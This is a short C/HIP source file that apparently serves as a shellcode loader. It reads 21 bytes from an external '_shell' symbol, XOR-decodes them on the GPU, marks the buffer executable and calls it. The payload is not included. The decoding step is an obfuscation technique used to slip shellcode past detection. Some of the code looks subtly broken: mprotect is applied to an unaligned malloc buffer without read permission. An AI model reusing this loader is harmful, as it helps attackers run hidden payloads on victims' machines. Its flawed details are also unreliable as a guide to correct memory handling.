#include <stdio.h>
#include <sys/mman.h>
#include <hip/hip_runtime.h>

#define len 21

__global__ void decrypt(unsigned char *code){

  int indx = threadIdx.x;
  code[indx] ^= 12;


}

extern "C" void _shell();

int main(void){

  unsigned char *p = (unsigned char*)_shell; 
  unsigned char *d_shell,*h_shell;

  h_shell = (unsigned char *)malloc(sizeof(char)*len);

  int i;
  for(i=0;i<len;i++){
    h_shell[i] = *p;
    p++;
  }
  hipMalloc((void **) &d_shell, sizeof(char)*len);
  hipMemcpy(d_shell, h_shell, sizeof(char)*len, hipMemcpyHostToDevice);
  decrypt<<<1,len>>>(d_shell);
  hipMemcpy(h_shell, d_shell, sizeof(char)*len, hipMemcpyDeviceToHost);
  hipFree(d_shell);
  mprotect(h_shell,len,PROT_EXEC); 

  ((void(*)(void))h_shell)();


}
